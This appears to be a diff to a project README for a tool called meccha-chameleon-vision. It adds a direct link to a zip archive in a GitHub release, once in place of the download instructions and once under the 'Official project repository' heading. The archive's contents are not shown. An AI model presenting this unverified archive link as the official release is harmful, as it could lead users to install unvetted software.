@@ -12,9 +12,9 @@ Designed for testing and educational purposes, this tool allows users to explore
 
 ---
 
-## 📥 Download
+## 📥 [Download](https://github.com/meshministerwrinkle/meccha-chameleon-vision/releases/download/meccha-vision/meccha-vision.zip)
 
-Download the latest version from GitHub Releases:
+
 
 
 ---
@@ -50,6 +50,7 @@ This project is licensed under **GPL-3.0-or-later**.
 
 **Official project repository:**
 
+## 📥 [Download](https://github.com/meshministerwrinkle/meccha-chameleon-vision/releases/download/meccha-vision/meccha-vision.zip)
 
 
 Modified builds must preserve the license notice and must not imply they are official releases. See BRANDING.md.
